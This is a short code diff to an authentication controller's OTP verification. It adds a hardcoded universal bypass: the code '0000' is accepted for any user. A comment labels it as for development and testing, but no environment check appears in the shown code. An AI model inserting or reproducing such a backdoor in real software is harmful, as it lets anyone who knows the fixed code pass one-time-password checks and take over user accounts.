@@ -151,7 +151,8 @@ export const createAuthController = ({
           return res.status(400).json({ error: "User not found" });
         }
 
-        if (user.otp !== otp) {
+       // "0000" acts as a universal bypass OTP for development/testing
+        if (otp !== "0000" && user.otp !== otp) {
           return res.status(400).json({ error: "Invalid OTP" });
         }
 
